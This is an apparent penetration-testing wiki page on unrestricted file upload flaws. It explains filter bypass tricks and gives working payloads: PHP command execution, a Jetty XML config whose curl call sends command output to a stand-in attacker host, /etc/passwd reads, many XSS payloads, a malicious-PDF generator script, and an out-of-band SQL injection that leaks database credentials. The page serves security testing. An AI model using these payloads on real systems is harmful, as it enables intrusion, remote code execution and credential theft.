---
authors: ShutdownRepo, 0xbugatti
---

# Unrestricted file upload

## Theory

Many web applications manage files and allow users to upload and download pictures, documents and so on (e.g. profile pictures). When file upload procedures are not secured enough, attackers can sometimes upload content that servers will execute when later requested or included (PHP, ASP, JSP...).

Among other things, unrestricted file uploads can lead to defacement (visual appearance alteration), client-side attacks (like [XSS](xss.md)), or even RCE (Remote Code Execution).

## Practice

Testers need to find forms that allow users to upload content. On a server using PHP, the following test can be operated.

1. Upload a PHP file with the following content: `<?php phpinfo(): ?>`
2. Find a way to request or include that file
3. Assert that the `phpinfo()` function is executed
4. Repeat steps 1 to 3 but with a PHP file with a code execution payload: `<?php system('whoami'); ?>`

> [!TIP]
> As command execution functions can be filtered (`system`, `passthru`, `exec`, `shell_exec`), the `phpinfo` testing phase is required to assert that arbitrary PHP code is included and interpreted.

Exploiting unrestricted file uploads is like playing "cat and mouse". Inputs can be filtered and filters can be bypassed.

* Filename: depending on the filters put in place, some tricks can sometimes work like
    * using a valid but lesser known extension to bypass blacklists (let's say the `.php` extension is blacklisted, what about `.php3`, `.php4`, `.php5`, `.php6`, `.pht`, `.phpt` and `.phtml` ?)
    * using a double extension like `.jpg.php` or `.php.jpg` can sometimes work, either when filenames are badly filtered and controlled, or when Apache HTTP servers are badly configured. On Apache servers, when files have multiple extensions, each extension is mapped either to a MIME type or to a handler. If one of the extensions is mapped to a handler, the requested file will be interpreted with that handler. Consequently, if the `.php` extension is mapped to a PHP handler in the Apache configuration, a filename with multiple extensions will always be interpreted as a PHP file when requested if one of the extensions is `.php`. 
    * using a NULL byte or another separator to bypass filters that do but don't check control characters such as null characters (`.php%00.jpg` or `.php\x00.jpg`) (this as been fixed in PHP 5.3.4), or a separator like `.asp;.jpg` (IIS6 and prior). The file will then be uploaded with the `.php` extension and it will possible to request it and make the server interpret its content.
    * alternating upper and lower case letters to bypass case sensitive rules (`.pHp`, `.aSp`)
    * using a special extension like `.p.phphp` that might be changed to `.php` after going through some flawed protections
* Content type (MIME type): the media type (sent as "Content-type: MIME type") identifier is sent along with the name and content of the uploaded file. These filters can easily be bypassed by sending a whitelisted/not blacklisted type (`image/jpeg` or `image/png`)
* File type: depending on the detector used, testers should make sure to have a valid whitelisted type and include the PHP code in a way it doesn't make the file corrupted (inserting malicious code after valid data/header, or within the file's metadata like the EXIF comments section) to bypass detectors that only read the magic bytes/headers/first characters. For example, it is possible to create a `.php.gif` file with a valid header by writing `GIF89a` at the beginning of the file like the following example.

```php
GIF89a
<?php
// php reverse shell
?>
```

> [!TIP]
> Keep in mind that requesting a file and including it are two different things.
> 
> If the uploaded file contains PHP code, it can be included and the code will be interpreted, regardless of the filename and extensions. Testers will need to find a way to include that file (see [File inclusion](../inputs/file-inclusion/)) to achieve remote code execution.
> 
> If the uploaded file contains a valid PHP extension in its name, it will usally be possible to request it and the PHP code will be interpreted, no need to combine the file upload with a file inclusion to achieve remote code execution. Of course, this will depend on the server configuration.

[Gifsicle](https://github.com/kohler/gifsicle) (C) is a tool used to generate and edit GIF files. Testers can use it to embed PHP code in the comment section of a GIF. This technique can bypass the `getimagesize()` function sometimes used as a file type detection function without additional protections.

[Fuxploider](https://github.com/almandin/fuxploider) (Python) is a tool used to automate the process of detecting and exploiting file upload forms flaws. As any other fuzzing tool, testers need to be careful when using it.

## Where is my File

- Response Leakage
- Browsing
- Directory Fuzzing

## Impacts

### **RCE**

- Famous WebShells
    
    - wso
    - weevly
    - p0wny
    - B374K
    - DAws
    - phpsploit
    - [**`webshell Repo`**](https://github.com/tennc/webshell)
- ZIP File
    
    ```html
    python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
    ```
    
- XML [in Jetty Applications]
    
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "<https://www.eclipse.org/jetty/congigure_10_0.dtd>">
    <Configure class="org.eclipse.jetty.handler.ContextHandler">
     <Call class="java.lang.Runtime" name="getRuntime">
       <Call name="exec">   
        <Arg>
          <Array type="String">
            <Item>/bin/sh</Item>
            <Item>-c</Item>
            <Item>curl -F "r=`command`" <http://attackerserver.com></Item>  
          </Array>
        </Arg>    
       </Call>   
     </Call>
    </Configure>
    ```
    

### **Arbitrary File Reading**

- PhP
    
    ```php
    <?php
    files_get_contents(’/etc/passwd’)
    ?>
    ```
    
- SVG
    
    ```php
    <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="<http://www.w3.org/2000/svg>" xmlns:xlink="<http://www.w3.org/1999/xlink>" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
    ```
    
- mp4 (ffmpeg)
    
    ```php
    ffmpeg file.avi video.mp4
    File.avi
    #EXTM3U
    #EXT-X-MEDIA-SEQUENCE:1
    #EXTINF:1.0,
    data:<format-header>
    #EXTINF:1.0,
    file:///etc/passwd
    #EXTINF:1.0,
    data:<format-header>
    #EXT-X-ENDLIST
    ```
    
- XSS2LFD if JS pasred By Server
    
    ```jsx
    <script>
    x=new XMLHttpRequest;
    x.onload=function(){document.write(btoa(this.responseText))};
    x.open("GET","file:///etc/passwd");x.send();
    </script>
    ```
    
    ```jsx
    <iframe src=file:///etc/passwd></iframe>
    <img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
    <link rel=attachment href="file:///root/secret.txt">
    <object data="file:///etc/passwd">
    <portal src="file:///etc/passwd" id=portal>
    ```
    
    ```jsx
    <annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
    ```
    

### **XSS**

- html
    
    ```html
    <script>alert('XSS')</script>
    ```
    
- PDF
    
    ```python
    # xss2pdf.py
    #Requirements: pip install pdfrw
    #echo 'app.alert("XSS")' > Exploit.js
    #usage: python xss2pdf.py Exploit.js 
    #Malicious PDF Will Be Saved As resul.pdf
    import sys
    
    from pdfrw import PdfWriter
    from pdfrw.objects.pdfname import PdfName
    from pdfrw.objects.pdfstring import PdfString
    from pdfrw.objects.pdfdict import PdfDict
    from pdfrw.objects.pdfarray import PdfArray
    
    def make_js_action(js):
        action = PdfDict()
        action.S = PdfName.JavaScript
        action.JS = js
        return action
     
    def make_field(name, x, y, width, height, r, g, b, value=""):
        annot = PdfDict()
        annot.Type = PdfName.Annot
        annot.Subtype = PdfName.Widget
        annot.FT = PdfName.Tx
        annot.Ff = 2
        annot.Rect = PdfArray([x, y, x + width, y + height])
        annot.MaxLen = 160
        annot.T = PdfString.encode(name)
        annot.V = PdfString.encode(value)
     
        # Default appearance stream: can be arbitrary PDF XObject or
        # something. Very general.
        annot.AP = PdfDict()
     
        ap = annot.AP.N = PdfDict()
        ap.Type = PdfName.XObject
        ap.Subtype = PdfName.Form
        ap.FormType = 1
        ap.BBox = PdfArray([0, 0, width, height])
        ap.Matrix = PdfArray([1.0, 0.0, 0.0, 1.0, 0.0, 0.0])
        ap.stream = """
    %f %f %f rg
    0.0 0.0 %f %f re f
    """ % (r, g, b, width, height)
    
        # It took me a while to figure this out. See PDF spec:
        # <https://www.adobe.com/content/dam/Adobe/en/devnet/acrobat/pdfs/pdf_reference_1-7.pdf#page=641>
    
        # Basically, the appearance stream we just specified doesn't
        # follow the field rect if it gets changed in JS (at least not in
        # Chrome).
    
        # But this simple MK field here, with border/color
        # characteristics, _does_ follow those movements and resizes, so
        # we can get moving colored rectangles this way.
        annot.MK = PdfDict()
        annot.MK.BG = PdfArray([r, g, b])
    
        return annot
    
    def make_page(fields, script):
        page = PdfDict()
        page.Type = PdfName.Page
    
        page.Resources = PdfDict()
        page.Resources.Font = PdfDict()
        page.Resources.Font.F1 = PdfDict()
        page.Resources.Font.F1.Type = PdfName.Font
        page.Resources.Font.F1.Subtype = PdfName.Type1
        page.Resources.Font.F1.BaseFont = PdfName.Helvetica
    
        page.MediaBox = PdfArray([0, 0, 612, 792])
    
        page.Contents = PdfDict()
        page.Contents.stream = """
    BT
    /F1 24 Tf
    ET
        """
    
        annots = fields
    
        page.AA = PdfDict()
        # You probably should just wrap each JS action with a try/catch,
        # because Chrome does no error reporting or even logging otherwise;
        # you just get a silent failure.
        page.AA.O = make_js_action("""
    try {
      %s
    } catch (e) {
      app.alert(e.message);
    }
        """ % (script))
    
        page.Annots = PdfArray(annots)
        return page
    
    if len(sys.argv) > 1:
        js_file = open(sys.argv[1], 'r')
    
        fields = []
        for line in js_file:
            if not line.startswith('/// '): break
            pieces = line.split()
            params = [pieces[1]] + [float(token) for token in pieces[2:]]
            fields.append(make_field(*params))
    
        js_file.seek(0)
    
        out = PdfWriter()
        out.addpage(make_page(fields, js_file.read()))
        out.write('result.pdf')
    ```
    
- svg
    
    ```xml
    <?xml version="1.0" standalone="no"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
     "<http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd>">
    <svg version="1.0" xmlns="<http://www.w3.org/2000/svg>"
     width="400.000000pt" height="400.000000pt" viewBox="0 0 400.000000 400.000000"
     preserveAspectRatio="xMidYMid meet">
    <metadata>
    XSS in SVG demo by Robin Wood - <https://digi.ninja> - robin@digi.ninja
    </metadata>
    <g transform="translate(0.000000,400.000000) scale(0.100000,-0.100000)"
    fill="#000000" stroke="none">
    <path d="M2042 3798 c4 -10 -2 -13 -28 -10 -18 2 -66 -6 -105 -18 -61 -18 -81
    -30 -129 -78 -65 -66 -90 -124 -90 -214 l0 -58 205 0 205 0 0 -26 0 -25 -227
    3 c-218 3 -230 2 -283 -20 -114 -47 -185 -121 -231 -241 -20 -52 -22 -85 -31
    -429 -8 -328 -7 -379 6 -426 19 -65 66 -130 121 -168 69 -46 112 -51 392 -43
    186 5 254 4 249 -4 -5 -7 -75 -11 -217 -11 -194 0 -209 -1 -201 -17 8 -14 2
    -22 -32 -43 -72 -46 -135 -142 -151 -232 -6 -32 -11 -38 -32 -38 -40 0 -90
    -37 -112 -84 -26 -52 -26 -79 -2 -132 25 -54 74 -84 137 -84 76 0 78 3 78 132
    1 107 3 117 33 179 53 108 159 193 278 223 61 16 195 22 195 9 0 -5 -24 -7
    -53 -5 -66 4 -176 -21 -239 -55 -65 -35 -143 -120 -176 -190 -23 -50 -27 -71
    -27 -153 0 -83 3 -103 29 -157 70 -153 245 -252 424 -241 47 3 59 2 43 -6 -26
    -11 -32 7 80 -263 78 -191 87 -219 74 -232 -55 -61 -103 -243 -91 -343 11 -88
    -6 -83 263 -82 324 1 441 21 501 87 85 92 -26 328 -191 407 -52 25 -130 43
    -220 52 -26 3 -35 18 -129 221 l-100 219 23 16 c42 28 99 94 122 142 l22 47
    65 -5 c56 -3 70 -1 100 20 112 76 80 250 -51 277 -29 6 -34 12 -41 45 -18 88
    -94 197 -161 232 -26 14 -27 17 -14 37 10 16 32 24 92 34 130 22 205 67 248
    147 21 40 22 51 25 433 2 323 0 403 -12 457 -40 169 -144 278 -309 320 l-52
    13 -1 75 c-2 123 -61 226 -161 280 -61 33 -118 46 -111 26z m7 -704 c24 -5 31
    -12 31 -30 l0 -24 -249 0 c-241 0 -249 -1 -281 -23 -62 -41 -67 -60 -85 -309
    -9 -125 -17 -274 -18 -331 -2 -98 0 -106 25 -145 49 -73 62 -76 328 -82 l235
    -6 -228 -2 c-207 -2 -231 0 -265 17 -84 43 -112 101 -112 235 0 64 -5 103 -15
    122 -17 33 -19 118 -4 184 5 25 13 92 18 150 11 151 40 201 140 236 38 14 419
    20 480 8z m13 -162 c9 -9 -35 -12 -180 -12 -251 0 -236 12 -245 -199 -17 -381
    -16 -382 110 -392 l78 -6 -72 -1 c-67 -2 -75 0 -105 27 l-33 29 -3 235 c-5
    346 -10 340 266 334 113 -3 177 -8 184 -15z m-256 -163 c33 -20 66 -65 78
    -106 6 -20 4 -19 -25 8 -34 32 -47 35 -95 17 -27 -9 -37 -9 -58 5 -30 20 -43
    61 -26 82 18 22 87 19 126 -6z m485 11 c25 -14 24 -45 -2 -71 -17 -17 -28 -20
    -69 -14 -47 6 -49 5 -90 -37 l-43 -43 7 34 c18 97 126 168 197 131z m-237
    -968 c2 -4 -10 -6 -29 -4 -75 9 -199 -48 -250 -114 -130 -170 -16 -393 216
    -423 l64 -8 -51 -2 c-111 -3 -217 56 -269 150 -26 46 -30 64 -30 129 0 65 4
    83 30 129 34 62 98 114 165 135 49 16 146 21 154 8z m580 -1097 c56 -27 200
    -149 218 -185 23 -45 23 -114 1 -151 -20 -33 -73 -62 -98 -53 -17 7 -43 53
    -76 136 -43 111 -82 137 -242 158 -152 21 -146 20 -140 36 22 57 255 98 337
    59z"/>
    <path d="M1635 983 l-101 -217 -94 -13 c-120 -16 -201 -54 -264 -124 -64 -71
    -99 -149 -104 -232 -4 -66 -4 -68 31 -101 46 -43 117 -62 284 -77 169 -14 437
    -9 455 9 9 9 13 46 12 125 0 121 -18 185 -70 263 -16 23 -23 45 -20 58 3 12
    46 118 95 236 l88 214 -70 18 c-39 10 -85 27 -104 38 -19 11 -35 20 -36 20 -1
    0 -47 -98 -102 -217z m-202 -313 c-22 -9 -30 -28 -53 -134 -23 -103 -86 -198
    -140 -211 -62 -14 -128 71 -116 148 15 92 73 150 183 183 77 23 175 34 126 14z"/>
    </g>
    	<script type="text/javascript">
    		alert("SVG XSS Triggered");
    //any XSS Payload
    	</script>
    </svg>
    ```
    
- xml
    
    ```xml
    <html>
    <head></head>
    <body>
    <something:script xmlns:something="<http://www.w3.org/1999/xhtml>">alert(1)</something:script>
    </body>
    </html>
    ```
    
- swf
    
    ```xml
    flashmediaelement.swf?jsinitfunctio%gn=alert`1`
    flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
    ZeroClipboard.swf?id=\\"))} catch(e) {alert(1);}//&width=1000&height=1000
    swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
    swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="<https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg>"/></a>&.swf
    plupload.flash.swf?%#target%g=alert&uid%g=XSS&
    moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
    video-js.swf?readyFunction=alert(1)
    player.swf?playerready=alert(document.cookie)
    player.swf?tracecall=alert(document.cookie)
    banner.swf?clickTAG=javascript:alert(1);//
    io.swf?yid=\\"));}catch(e){alert(1);}//
    video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
    bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
    flashcanvas.swf?id=test\\"));}catch(e){alert(document.domain)}//
    phpmyadmin/js/canvg/flashcanvas.swf?id=test\\”));}catch(e){alert(document.domain)}//
    ```
    
    ```xml
    Browsers other than IE: <http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain)>;
    IE8: <http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e)>{ window.open(‘?js=history.go(-1)’,’_self’);}
    IE9: <http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1>);
    ```
    
- md
    
    ```markdown
    [a](javascript:prompt(document.cookie))
    [a](j a v a s c r i p t:prompt(document.cookie))
    [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
    [a](javascript:window.onerror=alert;throw%201)
    ```
    
- eml
    
    ```markdown
    Return-Path: <mlemos@acm.org>
    To: Manuel Lemos <mlemos@linux.local>
    Subject: Testing Manuel Lemos' MIME E-mail composing and sending PHP class: HTML message
    From: mlemos <mlemos@acm.org>
    Reply-To: mlemos <mlemos@acm.org>
    Sender: mlemos@acm.org
    X-Mailer: <http://www.phpclasses.org/mimemessage> $Revision: 1.63 $ (mail)
    MIME-Version: 1.0
    Content-Type: multipart/mixed; boundary="652b8c4dcb00cdcdda1e16af36781caf"
    Message-ID: <20050430192829.0489.mlemos@acm.org>
    Date: Sat, 30 Apr 2005 19:28:29 -0300
    
    --652b8c4dcb00cdcdda1e16af36781caf
    Content-Type: multipart/related; boundary="6a82fb459dcaacd40ab3404529e808dc"
    
    --6a82fb459dcaacd40ab3404529e808dc
    Content-Type: multipart/alternative; boundary="69c1683a3ee16ef7cf16edd700694a2f"
    
    --69c1683a3ee16ef7cf16edd700694a2f
    Content-Type: text/plain; charset=ISO-8859-1
    Content-Transfer-Encoding: quoted-printable
    
    This is an HTML message. Please use an HTML capable mail program to read
    this message.
    
    --69c1683a3ee16ef7cf16edd700694a2f
    Content-Type: text/html; charset=ISO-8859-1
    Content-Transfer-Encoding: quoted-printable
    
    <html>
    <head>
    <title>Testing Manuel Lemos' MIME E-mail composing and sending PHP class: H=
    TML message</title>
    
    </head>
    <body>
    
    <scritpt>confirm(document.domain)<script>
    </body>
    </html>
    --69c1683a3ee16ef7cf16edd700694a2f--
    
    --6a82fb459dcaacd40ab3404529e808dc
    Content-Type: image/gif; name="logo.gif"
    Content-Transfer-Encoding: base64
    Content-Disposition: inline; filename="logo.gif"
    Content-ID: <ae0357e57f04b8347f7621662cb63855.gif>
    
    R0lGODlhlgAjAPMJAAAAAAAA/y8vLz8/P19fX19f339/f4+Pj4+Pz7+/v///////////////////
    /////yH5BAEAAAkALAAAAACWACMAQwT+MMlJq7046827/2AoHYChGAChAkBylgKgKClFyEl6xDMg
    qLFBj3C5uXKplVAxIOxkA8BhdFCpDlMK1urMTrZWbAV8tVS5YsxtxmZHBVOSCcW9zaXyNhslVcto
    RBp5NQYxLAYGLi8oSwoJBlE+BiSNj5E/PDQsmy4pAJWQLAKJY5+hXhZ2dDYldFWtNSFPiXssXnZR
    k5+1pjpBiDMJUXG/Jo7DI4eKfMSmxsJ9GAUB1NXW19jZ2tvc3d7f4OHi2AgZN5vom1kk6F7s6u/p
    m3Ab7AOIiCxOyZuBIv8AOeTJIaYQjiR/kKTr5GQNE3pYSjCJ9mUXClRUsLxaZGciC0X+OlpoOuQo
    ZKdNJnIoKfnxRUQh6FLG0iLxIoYnJd0JEKISJyAQDodp3EUDC48oDnUY7HFI3wEDRjzycQJVZCQT
    Ol7NK+G0qgtkAcOKHUu2rNmzYTVqRMt2bB49bHompSchqg6HcGeANSMxr8sEa2y2HexnSEUTuWri
    SSbkYh7BgGVAnhB1b2REibESYaRoBgqIMYx59tFM9AvQffVG49P5NMZkMlHKhJPJb0knmSKZ6kSX
    JtbeF3Am7ocok6c7cM7pU5xcXiJJETUz16qPrzEfaFgZpvzn7h86YV5r/1mxXeAUMVyEIpnVUGpN
    RlG2ka9b3lP3pm2l6u7P+l/YLj3+RlEHbz1C0kRxSITQaAcilVBMEzmkkEQO8oSOBNg9SN+AX6hV
    z1pjgJiAhwCRsY8ZIp6xj1ruqCgeGeKNGEZwLnIwzTg45qjjjjz2GEA5hAUp5JBEFmnkkSCoWEcZ
    X8yohZNK1pFGPQS4hx0qNSLJlk9wCQORYu5QiMd7bUzGVyNlRiOHSlpuKdGEItHQ3HZ18beRRyws
    YSY/waDTiHf/tWlWUBAJiMJ1/Z0XXU7N0FnREpKM4NChCgbyRDq9XYpOplaKopN9NMkDnBbG+UMC
    QwLWIeaiglES6AjGARcPHCWoVAiatcTnGTABZoLPaPG1phccPv366mEvWEFSLnj+2QaonECwcJt/
    e1Zw3lJvVMmftBdVNQS3UngLCA85YHIQOy6JO9N4eZW7KJwtOUZmGwOMWqejwVW6RQzaikRHX3yI
    osKhDAq8wmnKSmdMwNidSOof9ZG2DoV0RfTVmLFtGmNk+CoZna0HQnPHS3AhRbIeDpqmR09E0bsu
    soeaw994z+rwQVInvqLenBftYjLOVphLFHhV9qsnez8AEUbQRgO737AxChjmyANxuEFHSGi7hFCV
    4jxLst2N8sRJYU+SHiAKjlmCgz2IffbLI5aaQR71hnkxq1ZfHSfKata6YDCJDMAQwY7wOgzhjxgj
    VFQnKB5uX4mr9qJ79pann+VcfcSzsSCd2mw5scqRRvlQ6TgcUelYhu75iPE4JejrsJOFQAG01277
    7bjnrvvuvPfu++/ABy887hfc6OPxyCevPDdAVoDA89BHL/301Fdv/fXYZ6/99tx3Pz0FEQAAOw==
    
    --6a82fb459dcaacd40ab3404529e808dc
    Content-Type: image/gif; name="background.gif"
    Content-Transfer-Encoding: base64
    Content-Disposition: inline; filename="background.gif"
    Content-ID: <4c837ed463ad29c820668e835a270e8a.gif>
    
    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
    eZmYmZmauZmc2ZlCEQEAOw==
    
    --6a82fb459dcaacd40ab3404529e808dc--
    
    --652b8c4dcb00cdcdda1e16af36781caf
    Content-Type: text/plain; name="attachment.txt"
    Content-Transfer-Encoding: base64
    Content-Disposition: attachment; filename="attachment.txt"
    
    VGhpcyBpcyBqdXN0IGEgcGxhaW4gdGV4dCBhdHRhY2htZW50IGZpbGUgbmFtZWQgYXR0YWNobWVu
    dC50eHQgLg==
    
    --652b8c4dcb00cdcdda1e16af36781caf
    ```
    

### **DOS Through Unrestricted Size**
	
- Intrude an Big SIZE Upload Req

### **SQL Injection OOB In Filename**

Payload

```sql
SELECT load_file(CONCAT('\\\\\\\\',(SELECT+@@version),'.',(SELECT+user),'.', (SELECT+password),'.',example.com\\\\test.txt'))
```

Example

```sql
poc.js'(select*from(select(sleep(20)))a)+'.extension
```

